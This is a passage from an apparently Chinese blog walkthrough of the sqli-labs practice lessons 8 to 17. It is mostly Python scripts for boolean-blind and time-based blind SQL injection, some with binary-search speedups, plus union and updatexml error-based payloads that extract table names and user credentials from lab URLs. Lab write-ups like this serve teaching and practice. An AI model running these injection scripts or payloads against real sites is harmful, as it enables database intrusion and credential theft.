+&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">            payload_str=py_dict[<span class="string">&#x27;str3&#x27;</span>].<span class="built_in">format</span>(i,j)</span><br><span class="line">            pld=url+payload_str</span><br><span class="line">            req1=req.get(pld)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> req1.text:</span><br><span class="line">                str_head=str_head+<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(str_head)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://sqli/Less-8/&quot;</span></span><br><span class="line">    booler_injection(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><h4 id="最简单的time盲注"><a href="#最简单的time盲注" class="headerlink" title="最简单的time盲注"></a>最简单的time盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_injection</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_head=<span class="string">&quot;the_data_is:...&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    py_dict=&#123;</span><br><span class="line">        <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;security\&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            payload_str=url+py_dict[<span class="string">&#x27;str1&#x27;</span>].<span class="built_in">format</span>(i,j)</span><br><span class="line">            req1=req.get(url=payload_str,headers=headers)</span><br><span class="line">            next_time=time.time()</span><br><span class="line">            <span class="keyword">if</span>(next_time-start_time&gt;<span class="number">3</span>):</span><br><span class="line">                str_head=str_head+<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(str_head)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://sqli/Less-9/&quot;</span></span><br><span class="line">    <span class="comment">#booler_injection(url)</span></span><br><span class="line">    time_injection(url)</span><br></pre></td></tr></table></figure><p>我发现这个程序速度太慢了，于是加了一个二分搜索的优化，然而本人发现并没有提速反而变慢了，就很难受！</p><p>而且本人对算法没有研究过，代码真是难看，后面会学一下搜索的算法，然后再次优化</p><h4 id="二分搜索"><a href="#二分搜索" class="headerlink" title="二分搜索"></a>二分搜索</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_injection_add</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_head = <span class="string">&quot;the_data_is:...&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    py_dict = &#123;</span><br><span class="line">        <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;security\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;?id=1\&#x27; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_max=<span class="number">127</span>;the_min=<span class="number">32</span></span><br><span class="line">        <span class="keyword">while</span> the_min&lt;the_max:</span><br><span class="line">            mid=(the_max+the_min)&gt;&gt;<span class="number">1</span></span><br><span class="line">            payload_str=url+py_dict[<span class="string">&#x27;str1&#x27;</span>].<span class="built_in">format</span>(i,mid)</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            req1=req.get(payload_str,headers)</span><br><span class="line">            next_time=time.time()</span><br><span class="line">            <span class="keyword">if</span> next_time-start_time&gt;<span class="number">3</span>:</span><br><span class="line">                the_min=mid</span><br><span class="line">                <span class="keyword">if</span> the_max-the_min==<span class="number">1</span>: <span class="comment">#因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差1的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span></span><br><span class="line">                    mid=the_min+<span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max=mid</span><br><span class="line">        str_head=str_head+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(str_head)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://sqli/Less-9/&quot;</span></span><br><span class="line">    <span class="comment">#booler_injection(url)</span></span><br><span class="line">    <span class="comment">#time_injection(url)</span></span><br><span class="line">    time_injection_add(url)</span><br></pre></td></tr></table></figure><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> req</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line">import <span class="type">time</span></span><br><span class="line">def time_injection_add(url):</span><br><span class="line">    str_head <span class="operator">=</span> &quot;the_data_is:...&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;&#125;</span><br><span class="line">    py_dict = &#123;</span><br><span class="line">        <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;?id=1\&quot; and if(ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;?id=1\&quot; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;</span>security\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;?id=1\&quot; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_max<span class="operator">=</span><span class="number">127</span>;the_min<span class="operator">=</span><span class="number">32</span></span><br><span class="line">        while the_min<span class="operator">&lt;</span>the_max:</span><br><span class="line">            mid<span class="operator">=</span>(the_max<span class="operator">+</span>the_min)<span class="operator">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">            payload_str<span class="operator">=</span>url<span class="operator">+</span>py_dict[<span class="string">&#x27;str1&#x27;</span>].format(i,mid)</span><br><span class="line">            start_time<span class="operator">=</span>time.time()</span><br><span class="line">            req1<span class="operator">=</span>req.get(payload_str,headers)</span><br><span class="line">            next_time<span class="operator">=</span>time.time()</span><br><span class="line">            if next_time<span class="operator">-</span>start_time<span class="operator">&gt;</span><span class="number">3</span>:</span><br><span class="line">                the_min<span class="operator">=</span>mid</span><br><span class="line">                if the_max<span class="operator">-</span>the_min<span class="operator">=</span><span class="operator">=</span><span class="number">1</span>: #因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差<span class="number">1</span>的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span><br><span class="line">                    mid<span class="operator">=</span>the_min<span class="operator">+</span><span class="number">1</span></span><br><span class="line">                    break</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max<span class="operator">=</span>mid</span><br><span class="line">        str_head<span class="operator">=</span>str_head<span class="operator">+</span>chr(mid)</span><br><span class="line">        print(str_head)</span><br><span class="line"></span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">    url<span class="operator">=</span>&quot;http://sqli/Less-10/&quot;</span><br><span class="line">    #booler_injection(url)</span><br><span class="line">    #time_injection(url)</span><br><span class="line">    time_injection_add(url)</span><br></pre></td></tr></table></figure><p>本人简单学习了一下二分查找的算法，优化了一下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string">username=&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br><span class="line">username<span class="operator">=</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">username=&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span>  information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#</span><br><span class="line">username<span class="operator">=</span><span class="string">&#x27; union select 1,group_concat(concat(username,0x7e,password)) from</span></span><br><span class="line"><span class="string">users#</span></span><br><span class="line"><span class="string">password=123</span></span><br></pre></td></tr></table></figure><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>adn&quot;) union select 1,2#</span><br><span class="line">username=adn&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br><span class="line">username<span class="operator">=</span>adn&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;#</span><br><span class="line">username=adn&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;#</span><br><span class="line">username<span class="operator">=</span>adm&quot;) union select 1,group_concat(concat(username,0x7e,password)) from users#</span><br><span class="line">password=123</span><br></pre></td></tr></table></figure><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;) || updatexml(1,concat(0x7e,database(),0x7e),1)-- +</span></span><br><span class="line"><span class="string">username=admin&#x27;</span>) <span class="operator">||</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- +</span></span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;) || updatexml(1,substr(concat(0x7e,(select group_concat(column_name) from  information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),0x7e),1,32),1)-- +</span></span><br></pre></td></tr></table></figure><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><h4 id="二分搜索bool盲注"><a href="#二分搜索bool盲注" class="headerlink" title="二分搜索bool盲注"></a>二分搜索bool盲注</h4><p>加上了二分搜索的bool盲注，速度相当可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> req</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">def bool_injection(url,payld_dict):</span><br><span class="line">    the_data<span class="operator">=</span><span class="string">&#x27;the_date:...&#x27;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_min<span class="operator">=</span><span class="number">32</span>;the_max<span class="operator">=</span><span class="number">127</span></span><br><span class="line">        while the_min<span class="operator">&lt;</span>the_max:</span><br><span class="line">            mid<span class="operator">=</span>(the_max<span class="operator">+</span>the_min)<span class="operator">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">            post_data = &#123;</span><br><span class="line">                <span class="string">&#x27;uname&#x27;</span>: payld_dict[<span class="string">&#x27;pyld3&#x27;</span>].format(i,mid),</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            req1<span class="operator">=</span>req.post(url,post_data,headers)</span><br><span class="line">            if <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span> <span class="keyword">in</span> req1.text:</span><br><span class="line">                the_min<span class="operator">=</span>mid</span><br><span class="line">                if the_max <span class="operator">-</span> the_min <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>:  # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差<span class="number">1</span>的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span><br><span class="line">                    mid <span class="operator">=</span> the_min <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">                    break</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max<span class="operator">=</span>mid</span><br><span class="line">        the_data<span class="operator">=</span>the_data<span class="operator">+</span>chr(mid)</span><br><span class="line">        print(the_data)</span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">    url<span class="operator">=</span>&quot;http://sqli/Less-14/&quot;</span><br><span class="line">    payld_dict=&#123;</span><br><span class="line">        <span class="string">&#x27;pyld1&#x27;</span>:<span class="string">&#x27;admin\&quot; and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyld2&#x27;</span>:<span class="string">&#x27;admin\&quot; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;</span>security\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyld3&#x27;</span>:<span class="string">&#x27;admin\&quot; and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;</span>users\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    bool_injection(url,payld_dict)</span><br></pre></td></tr></table></figure><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> req</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">def bool_injection(url,payld_dict):</span><br><span class="line">    the_data<span class="operator">=</span><span class="string">&#x27;the_date:...&#x27;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_min<span class="operator">=</span><span class="number">32</span>;the_max<span class="operator">=</span><span class="number">127</span></span><br><span class="line">        while the_min<span class="operator">&lt;</span>the_max:</span><br><span class="line">            mid<span class="operator">=</span>(the_max<span class="operator">+</span>the_min)<span class="operator">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">            post_data = &#123;</span><br><span class="line">                <span class="string">&#x27;uname&#x27;</span>: payld_dict[<span class="string">&#x27;pyld1&#x27;</span>].format(i,mid),</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            req1<span class="operator">=</span>req.post(url,post_data,headers)</span><br><span class="line">            if <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span> <span class="keyword">in</span> req1.text:</span><br><span class="line">                the_min<span class="operator">=</span>mid</span><br><span class="line">                if the_max <span class="operator">-</span> the_min <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>:  # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差<span class="number">1</span>的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span><br><span class="line">                    mid <span class="operator">=</span> the_min <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">                    break</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max<span class="operator">=</span>mid</span><br><span class="line">        the_data<span class="operator">=</span>the_data<span class="operator">+</span>chr(mid)</span><br><span class="line">        print(the_data)</span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">    url<span class="operator">=</span>&quot;http://sqli/Less-15/&quot;</span><br><span class="line">    payld_dict=&#123;</span><br><span class="line">        &#x27;pyld1&#x27;:&#x27;admin\&#x27; and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;,</span><br><span class="line">        &#x27;pyld2&#x27;:&#x27;admin\&#x27; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;security\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;,</span><br><span class="line">        &#x27;pyld3&#x27;:&#x27;admin\&#x27; and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;users\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    bool_injection(url,payld_dict)</span><br></pre></td></tr></table></figure><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests <span class="keyword">as</span> req</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">def bool_injection(url,payld_dict):</span><br><span class="line">    the_data<span class="operator">=</span><span class="string">&#x27;the_date:...&#x27;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        the_min<span class="operator">=</span><span class="number">32</span>;the_max<span class="operator">=</span><span class="number">127</span></span><br><span class="line">        while the_min<span class="operator">&lt;</span>the_max:</span><br><span class="line">            mid<span class="operator">=</span>(the_max<span class="operator">+</span>the_min)<span class="operator">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">            post_data = &#123;</span><br><span class="line">                <span class="string">&#x27;uname&#x27;</span>: payld_dict[<span class="string">&#x27;pyld1&#x27;</span>].format(i,mid),</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            req1<span class="operator">=</span>req.post(url,post_data,headers)</span><br><span class="line">            if <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span> <span class="keyword">in</span> req1.text:</span><br><span class="line">                the_min<span class="operator">=</span>mid</span><br><span class="line">                if the_max <span class="operator">-</span> the_min <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>:  # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差<span class="number">1</span>的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码</span><br><span class="line">                    mid <span class="operator">=</span> the_min <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">                    break</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                the_max<span class="operator">=</span>mid</span><br><span class="line">        the_data<span class="operator">=</span>the_data<span class="operator">+</span>chr(mid)</span><br><span class="line">        print(the_data)</span><br><span class="line">if __name__<span class="operator">=</span><span class="operator">=</span>&quot;__main__&quot;:</span><br><span class="line">    url<span class="operator">=</span>&quot;http://sqli/Less-16/&quot;</span><br><span class="line">    payld_dict=&#123;</span><br><span class="line">        <span class="string">&#x27;pyld1&#x27;</span>:<span class="string">&#x27;admin\&quot;) and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyld2&#x27;</span>:<span class="string">&#x27;admin\&quot;) and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#x27;</span>security\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyld3&#x27;</span>:<span class="string">&#x27;admin\&quot;) and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;</span>users\<span class="string">&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    bool_injection(url,payld_dict)</span><br></pre></td></tr></table></figure><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><h4 id="update注入"><a 